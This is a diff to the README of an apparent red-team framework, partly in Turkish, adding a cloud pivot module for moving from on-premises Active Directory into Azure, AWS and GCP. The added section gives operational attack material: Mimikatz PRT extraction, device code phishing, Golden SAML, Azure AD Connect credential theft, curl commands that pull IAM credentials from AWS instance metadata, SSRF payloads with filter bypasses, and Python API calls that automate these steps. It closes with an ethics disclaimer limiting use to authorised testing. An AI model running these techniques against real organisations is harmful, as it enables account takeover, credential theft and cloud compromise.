@@ -88,6 +88,18 @@ Access the UI at `http://localhost:8080`
 │  │                                                                                  │   │
 │  │  Methods: WMIExec │ PSExec │ SMBExec │ DCOMExec │ AtExec                        │   │
 │  │  Profiles: None │ Default │ Stealth │ Paranoid │ Aggressive                     │   │
+│  │                                                                                  │   │
+│  │  ┌─────────────────────────── ☁️ CLOUD PIVOT ─────────────────────────────────┐│   │
+│  │  │                                                                            ││   │
+│  │  │  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐             ││   │
+│  │  │  │ On-Prem  │───▶│ Azure AD │───▶│   AWS    │───▶│   GCP    │             ││   │
+│  │  │  │   AD     │    │ PRT/SAML │    │  IMDS    │    │ Metadata │             ││   │
+│  │  │  └──────────┘    └──────────┘    └──────────┘    └──────────┘             ││   │
+│  │  │                                                                            ││   │
+│  │  │  Azure: PRT Hijack │ Device Code │ Golden SAML │ AADC Exploit             ││   │
+│  │  │  AWS: IMDSv1/v2 │ SSRF Relay │ Role Chain │ User-Data Secrets            ││   │
+│  │  │  GCP: SA Token │ Workload Identity │ Project Enum                         ││   │
+│  │  └────────────────────────────────────────────────────────────────────────────┘│   │
 │  └─────────────────────────────────────────────────────────────────────────────────┘   │
 │                                                                                         │
 │  ┌─────────────────────────────────────────────────────────────────────────────────┐   │
@@ -153,7 +165,8 @@ Access the UI at `http://localhost:8080`
 │  │   ├── kerberos_chain.py          # Kerberos attacks                                  │
 │  │   ├── kerberos_relay_ninja.py    # 🥷 Domain takeover <2min                          │
 │  │   ├── ntlm_relay.py              # NTLM relay + coercion                             │
-│  │   ├── lateral_movement.py        # Lateral techniques                                │
+│  │   ├── lateral_movement.py        # Lateral techniques + cloud pivot                  │
+│  │   ├── cloud_pivot.py             # ☁️ Azure/AWS/GCP hybrid pivot                     │
 │  │   ├── evasion.py                 # Evasion profiles                                  │
 │  │   ├── c2_beacon.py               # C2 beacon management                              │
 │  │   └── ...                        # 30+ modules                                       │
@@ -171,6 +184,7 @@ Access the UI at `http://localhost:8080`
 │  │                                                                                      │
 │  ├── configs/               # Configuration files                                       │
 │  │   ├── relay_ninja_config.yaml    # Relay Ninja settings                              │
+│  │   ├── cloud_pivot_config.yaml    # ☁️ Cloud pivot settings                           │
 │  │   └── evasion_profile_*.yaml     # Evasion profiles                                  │
 │  │                                                                                      │
 │  ├── agents/                # Deployable agents                                         │
@@ -195,6 +209,7 @@ Access the UI at `http://localhost:8080`
 | **NTLM Relay** | LDAP/SMB/AD CS relay with coercion triggers | `/relay` |
 | **Evasion Testing** | YARA, strings, entropy, behavioral analysis | `/evasion` |
 | **🧠 ML Evasion Booster** | GAN-powered payload mutation, 0/70 VT target | `/evasion` |
+| **☁️ Cloud Pivot** | Azure PRT/AWS IMDS/GCP - Hybrid lateral movement | `/lateral` |
 | **Lateral Movement** | WMI/PSExec/DCOM with evasion profiles | `/lateral` |
 | **C2 Framework** | Beacon management with multi-language agents | `/c2` |
 | **Process Injection** | Shellcode injection with LOTL execution | `/payloads` |
@@ -921,6 +936,453 @@ curl -X POST http://localhost:8080/lateral/dump \
   -H "Content-Type: application/json" \
   -d '{"target":"192.168.1.10","method":"secretsdump"}'
 ```
+
+---
+
+## ☁️ Cloud Pivot - Zero-Trust Bypass & Hybrid Lateral Movement
+
+**On-prem'den cloud ortamlarına** seamless lateral movement. Azure AD, AWS ve GCP'ye hybrid pivot chain.
+
+### 🎯 Neden Cloud Pivot?
+
+Modern kurumsal ortamlarda **Hybrid Identity** yaygın:
+- On-prem Active Directory + Azure AD Connect
+- AWS IAM Federation
+- GCP Workload Identity
+
+Bu hibrit yapı, **on-prem compromise → cloud takeover** için fırsatlar yaratır!
+
+### 🏗️ Mimari Şema
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                       ☁️ CLOUD PIVOT ARCHITECTURE                                       │
+│                    Zero-Trust Bypass & Hybrid Lateral Movement                          │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+                    ┌─────────────────────────────────────────┐
+                    │           ON-PREMISES AD                │
+                    │  ┌─────────────────────────────────┐   │
+                    │  │  Domain Controller (DC01)       │   │
+                    │  │  • User credentials            │   │
+                    │  │  • Computer accounts           │   │
+                    │  │  • Group memberships           │   │
+                    │  └─────────────┬───────────────────┘   │
+                    │                │                        │
+                    │  ┌─────────────▼───────────────────┐   │
+                    │  │  Azure AD Connect Server       │   │
+                    │  │  • MSOL_<guid> sync account    │   │
+                    │  │  • Password Hash Sync (PHS)    │   │
+                    │  │  • Pass-through Auth (PTA)     │   │
+                    │  └─────────────┬───────────────────┘   │
+                    └────────────────┼────────────────────────┘
+                                     │
+        ┌────────────────────────────┼────────────────────────────┐
+        │                            │                            │
+        ▼                            ▼                            ▼
+┌───────────────────┐    ┌───────────────────┐    ┌───────────────────┐
+│    🔷 AZURE AD    │    │     🟠 AWS        │    │     🟢 GCP        │
+├───────────────────┤    ├───────────────────┤    ├───────────────────┤
+│                   │    │                   │    │                   │
+│  ATTACK VECTORS:  │    │  ATTACK VECTORS:  │    │  ATTACK VECTORS:  │
+│                   │    │                   │    │                   │
+│  ┌─────────────┐  │    │  ┌─────────────┐  │    │  ┌─────────────┐  │
+│  │ PRT Hijack  │  │    │  │ IMDS v1/v2  │  │    │  │ SA Token    │  │
+│  │ Device Code │  │    │  │ SSRF Relay  │  │    │  │ Workload ID │  │
+│  │ Golden SAML │  │    │  │ Role Chain  │  │    │  │ Project MD  │  │
+│  │ AADC Abuse  │  │    │  │ User-Data   │  │    │  │ Custom Attr │  │
+│  │ Seamless SSO│  │    │  │ Assume Role │  │    │  │ SA Keys     │  │
+│  └─────────────┘  │    └─────────────┘  │    │  └─────────────┘  │
+│                   │    │                   │    │                   │
+│  TARGETS:         │    │  TARGETS:         │    │  TARGETS:         │
+│  • MS Graph API   │    │  • S3 Buckets     │    │  • GCS Buckets    │
+│  • Azure Portal   │    │  • EC2 Instances  │    │  • BigQuery       │
+│  • Key Vault      │    │  • Lambda         │    │  • Cloud Functions│
+│  • Azure Storage  │    │  • Secrets Mgr    │    │  • Secret Manager │
+│                   │    │                   │    │                   │
+└─────────┬─────────┘    └─────────┬─────────┘    └─────────┬─────────┘
+          │                        │                        │
+          └────────────────────────┼────────────────────────┘
+                                   │
+                                   ▼
+                    ┌─────────────────────────────────────────┐
+                    │         🎯 FULL CLOUD COMPROMISE        │
+                    │  • Data exfiltration                   │
+                    │  • Persistent backdoors                │
+                    │  • Cross-cloud pivot                   │
+                    │  • Privilege escalation                │
+                    └─────────────────────────────────────────┘
+```
+
+### 🔷 Azure AD Pivot Methods
+
+```
+┌──────────────────────────────────────────────────────────────────────────────────────────┐
+│                              AZURE AD PIVOT CHAIN                                        │
+└──────────────────────────────────────────────────────────────────────────────────────────┘
+
+   ┌─────────────┐                    ┌─────────────┐                   ┌─────────────┐
+   │  On-Prem    │                    │  Azure AD   │                   │   Target    │
+   │  Foothold   │                    │   Tenant    │                   │  Resources  │
+   └──────┬──────┘                    └──────┬──────┘                   └──────┬──────┘
+          │                                  │                                 │
+          │  ┌───────────────────────────────┴───────────────────────────────┐ │
+          │  │                                                               │ │
+          ▼  ▼                                                               ▼ ▼
+   
+   METHOD 1: PRT HIJACKING (Azure AD Joined Device)
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [Workstation] ──Mimikatz──▶ [Extract PRT] ──Pass-the-PRT──▶ [Graph API Token]     │
+   │       │                           │                              │                  │
+   │       │                           │  PRT = Primary Refresh Token │                  │
+   │       │                           │  Session Key = Crypto key    │                  │
+   │       │                           │                              ▼                  │
+   │       │                           │                    ┌─────────────────┐         │
+   │       │                           │                    │ Microsoft Graph │         │
+   │       │                           │                    │ Azure Portal    │         │
+   │       │                           │                    │ Key Vault       │         │
+   │       │                           │                    └─────────────────┘         │
+   │       │                           │                                                 │
+   │  Commands:                        │                                                 │
+   │  • sekurlsa::cloudap              │                                                 │
+   │  • roadtoken.exe --dump           │                                                 │
+   │  • AADInternals                   │                                                 │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+   
+   METHOD 2: DEVICE CODE PHISHING
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [Attacker] ──Generate Code──▶ [ABC123] ──Phish User──▶ [User Authenticates]       │
+   │       │                            │                          │                     │
+   │       │                            │   microsoft.com/         │                     │
+   │       │                            │   devicelogin            │                     │
+   │       │                            │                          ▼                     │
+   │       │                            │              ┌───────────────────┐             │
+   │       │◄───Poll Token──────────────┘              │ Access + Refresh  │             │
+   │       │                                           │     Tokens        │             │
+   │       ▼                                           └───────────────────┘             │
+   │  ┌─────────────────┐                                                               │
+   │  │ Full API Access │  No MFA bypass needed - user does it for you!                 │
+   │  └─────────────────┘                                                               │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+   
+   METHOD 3: GOLDEN SAML (via ADFS)
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [ADFS Server] ──Extract Cert──▶ [Token Signing Cert] ──Forge SAML──▶ [Any User]  │
+   │       │                               │                                  │          │
+   │       │  DKM Key from AD              │                                  │          │
+   │       │  ADFS Config DB               │                                  ▼          │
+   │       │                               │                      ┌─────────────────┐   │
+   │       │                               │                      │ Impersonate ANY │   │
+   │       │                               │                      │ federated user  │   │
+   │       │                               │                      └─────────────────┘   │
+   │                                                                                     │
+   │  Persistence: Cert valid for YEARS, no password reset helps!                       │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+   
+   METHOD 4: AZURE AD CONNECT ABUSE
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [AADC Server] ──AADInternals──▶ [MSOL_ Account] ──DCSync Rights──▶ [All Hashes]  │
+   │       │                               │                                │            │
+   │       │  LocalDB extraction           │  MSOL_<guid>@tenant           │            │
+   │       │  Get-AADIntSyncCredentials    │  .onmicrosoft.com             ▼            │
+   │       │                               │                    ┌─────────────────┐     │
+   │       │                               │                    │ Sync ALL users  │     │
+   │       │                               │                    │ Cloud + On-prem │     │
+   │       │                               │                    └─────────────────┘     │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+```
+
+### 🟠 AWS Pivot Methods
+
+```
+┌──────────────────────────────────────────────────────────────────────────────────────────┐
+│                                AWS PIVOT CHAIN                                           │
+└──────────────────────────────────────────────────────────────────────────────────────────┘
+
+   METHOD 1: IMDS EXPLOITATION (Direct)
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [EC2 Shell] ──curl──▶ [169.254.169.254] ──Get Role──▶ [IAM Credentials]           │
+   │       │                      │                              │                       │
+   │       │   IMDSv1: Direct     │   /latest/meta-data/         │                       │
+   │       │   IMDSv2: Token      │   iam/security-credentials/  │                       │
+   │       │                      │                              ▼                       │
+   │       │                      │                  ┌───────────────────┐               │
+   │       │                      │                  │ AccessKeyId       │               │
+   │       │                      │                  │ SecretAccessKey   │               │
+   │       │                      │                  │ SessionToken      │               │
+   │       │                      │                  └───────────────────┘               │
+   │                                                                                     │
+   │  # IMDSv1 (if not blocked)                                                         │
+   │  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/            │
+   │                                                                                     │
+   │  # IMDSv2 (token required)                                                         │
+   │  TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \            │
+   │          http://169.254.169.254/latest/api/token)                                  │
+   │  curl -H "X-aws-ec2-metadata-token: $TOKEN" \                                      │
+   │       http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE        │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+   
+   METHOD 2: SSRF RELAY
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [Web App SSRF] ──Inject URL──▶ [169.254.169.254] ──Exfil Creds──▶ [Attacker]     │
+   │       │                              │                                │             │
+   │       │  ?url=http://169.254...      │                                │             │
+   │       │  ?fetch=http://169.254...    │                                │             │
+   │       │  ?proxy=http://169.254...    │                                ▼             │
+   │       │                              │                    ┌─────────────────┐       │
+   │       │                              │                    │ Stolen AWS Keys │       │
+   │       │                              │                    └─────────────────┘       │
+   │                                                                                     │
+   │  Payloads:                                                                         │
+   │  • http://169.254.169.254/latest/meta-data/iam/security-credentials/               │
+   │  • http://[::ffff:169.254.169.254]/  (IPv6 bypass)                                 │
+   │  • http://169.254.169.254.nip.io/    (DNS rebinding)                               │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+   
+   METHOD 3: ROLE CHAINING
+   ┌─────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                     │
+   │  [Initial Role] ──AssumeRole──▶ [Higher Priv Role] ──AssumeRole──▶ [Admin Role]   │
+   │       │                              │                                │             │
+   │       │  Role A (limited)            │  Role B (more access)         │             │
+   │       │                              │                                ▼             │
+   │       │                              │                    ┌─────────────────┐       │
+   │       │                              │                    │  Full Admin     │       │
+   │       │                              │                    │  Access         │       │
+   │       │                              │                    └─────────────────┘       │
+   │                                                                                     │
+   │  # Enumerate assumable roles                                                       │
+   │  aws iam list-roles --query "Roles[?AssumeRolePolicyDocument...]"                  │
+   │                                                                                     │
+   │  # Chain assume role                                                               │
+   │  aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/HigherPrivRole           │
+   └─────────────────────────────────────────────────────────────────────────────────────┘
+```
+
+### 🔧 Kullanım
+
+#### Python API
+
+```python
+from cybermodules.cloud_pivot import (
+    CloudPivotOrchestrator,
+    CloudProvider,
+    suggest_attack_path
+)
+
+# Create orchestrator
+orchestrator = CloudPivotOrchestrator({
+    "azure_tenant_id": "contoso.onmicrosoft.com",
+    "domain": "CONTOSO.COM"
+})
+
+# Auto-detect and pivot
+results = await orchestrator.auto_pivot(
+    source_env="onprem",
+    target_provider=CloudProvider.AZURE
+)
+
+for result in results:
+    if result.success:
+        print(f"✅ {result.method.value}: {result.target}")
+        print(f"   Credentials: {result.credentials.credential_type.value}")
+        print(f"   Attack path: {' → '.join(result.attack_path)}")
+
+# Get AI-powered attack path suggestions
+paths = orchestrator.suggest_attack_path(
+    current_access=["domain_user", "local_admin"],
+    target_provider=CloudProvider.AZURE
+)
+
+for path in paths:
+    print(f"\n📍 {path['name']}")
+    print(f"   Difficulty: {path['difficulty']}")
+    print(f"   Success rate: {path['success_probability']:.0%}")
+    print(f"   MITRE: {', '.join(path['mitre_techniques'])}")
+```
+
+#### Azure PRT Hijacking
+
+```python
+from cybermodules.cloud_pivot import AzurePRTHijacker
+
+hijacker = AzurePRTHijacker(tenant_id="contoso.onmicrosoft.com")
+
+# Extract PRT from Azure AD joined device
+prt_context = await hijacker.extract_prt_mimikatz("WORKSTATION01", creds)
+
+# Pass-the-PRT for access token
+token = await hijacker.pass_the_prt(
+    prt_context,
+    target_resource="https://graph.microsoft.com"
+)
+
+print(f"Access token: {token.value[:50]}...")
+
+# Device code phishing
+user_code, device_code = await hijacker.device_code_phish()
+print(f"Send user to: https://microsoft.com/devicelogin")
+print(f"Code: {user_code}")
+
+# Poll for authentication
+token = await hijacker.poll_device_code(device_code)
+```
+
+#### AWS Metadata Relay
+
+```python
+from cybermodules.cloud_pivot import AWSMetadataRelay
+
+relay = AWSMetadataRelay()
+
+# Direct IMDS exploitation (on EC2)
+creds = await relay.exploit_imdsv1()  # or exploit_imdsv2()
+
+if creds:
+    print(f"Access Key: {creds.access_key_id}")
+    print(f"Role ARN: {creds.role_arn}")
+    
+    # Export as env vars
+    env = creds.to_env_vars()
+    
+# SSRF relay through vulnerable app
+creds = await relay.ssrf_relay(
+    vulnerable_url="https://app.target.com/fetch",
+    ssrf_param="url"
+)
+
+# Get EC2 user-data (often contains secrets!)
+user_data = await relay.get_user_data()
+```
+
+#### Lateral Movement Integration
+
+```python
+from cybermodules.lateral_movement import CloudLateralMovement, cloud_pivot_sync
+
+# Async usage
+cloud = CloudLateralMovement(scan_id="test-001")
+
+# Azure pivot
+result = await cloud.pivot_to_azure(
+    target="WORKSTATION01",
+    method="prt_hijack"
+)
+
+# AWS pivot
+result = await cloud.pivot_to_aws(
+    ssrf_url="https://vuln-app.com/proxy"
+)
+
+# GCP pivot
+result = await cloud.pivot_to_gcp()
+
+# Get attack path suggestions
+paths = cloud.suggest_attack_path(
+    current_access=["domain_user", "ec2_shell"],
+    target_provider="azure"
+)
+
+# Sync wrapper for non-async code
+result = cloud_pivot_sync(
+    scan_id="test-001",
+    method="azure_prt",
+    target="WORKSTATION01"
+)
+```
+
+### 📊 Attack Paths (AI-Suggested)
+
+| Path ID | Name | Difficulty | Stealth | Success Rate | Required Access |
+|---------|------|------------|---------|--------------|-----------------|
+| `azure_prt_to_graph` | PRT to Microsoft Graph | Medium | Medium | 75% | local_admin_on_aad_device |
+| `azure_device_code_phish` | Device Code Phishing | Easy | Low | 60% | email_access |
+| `azure_aadc_pivot` | AADC Sync Account Abuse | Hard | Medium | 80% | admin_on_aadc_server |
+| `azure_golden_saml` | Golden SAML via ADFS | Hard | High | 90% | admin_on_adfs |
+| `aws_ssrf_to_keys` | SSRF to AWS Keys | Medium | Medium | 70% | ssrf_vulnerability |
+| `aws_imds_exploit` | EC2 IMDS Exploitation | Easy | High | 85% | ec2_shell |
+| `aws_role_chain` | AWS Role Chaining | Medium | High | 65% | initial_aws_creds |
+| `gcp_sa_token` | GCP Service Account Token | Easy | High | 85% | gce_shell |
+| `hybrid_onprem_to_cloud` | Full On-Prem to Cloud | Hard | Medium | 70% | domain_admin |
+
+### 🔒 MITRE ATT&CK Mapping
+
+| Technique | ID | Cloud Pivot Method |
+|-----------|----|--------------------|
+| Valid Accounts: Cloud | T1078.004 | PRT, Device Code, SAML |
+| Steal Application Access Token | T1528 | PRT Hijack |
+| Forge Web Credentials: SAML | T1606.002 | Golden SAML |
+| Unsecured Credentials: Cloud | T1552.005 | IMDS, Metadata |
+| Account Manipulation | T1098 | Role Chaining |
+| Cloud Service Discovery | T1526 | Enumeration |
+
+### ⚙️ YAML Configuration
+
+```yaml
+# configs/cloud_pivot_config.yaml
+
+cloud_provider: azure  # azure, aws, gcp, hybrid
+
+azure:
+  tenant_id: "contoso.onmicrosoft.com"
+  prt_hijack:
+    enabled: true
+    method: mimikatz  # mimikatz, roadtools
+  device_code_phish:
+    enabled: true
+    client_id: "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+  aadc_exploit:
+    enabled: true
+    auto_discover: true
+  golden_saml:
+    enabled: true
+
+aws:
+  imds:
+    try_v1_first: true
+    timeout: 5
+  ssrf_relay:
+    enabled: true
+  role_chain:
+    max_depth: 5
+
+gcp:
+  metadata:
+    timeout: 5
+  target_service_accounts:
+    - "default"
+
+hybrid:
+  pivot_chain:
+    direction: "onprem_to_cloud"
+    methods:
+      - prt_hijack
+      - aadc_exploit
+      - golden_saml
+
+attack_paths:
+  stealth_preference: medium
+  auto_suggest: true
+  analyze_weak_creds: true
+```
+
+### ⚠️ Etik Kullanım
+
+Bu modül **yalnızca yasal pentest ve red team operasyonları** için tasarlanmıştır:
+
+- ✅ Authorized cloud penetration testing
+- ✅ Hybrid AD security assessments
+- ✅ Red team exercises with written permission
+- ✅ Cloud security research
+- ❌ Unauthorized cloud access
+- ❌ Data theft
+- ❌ Any illegal activities
 
 ---
 
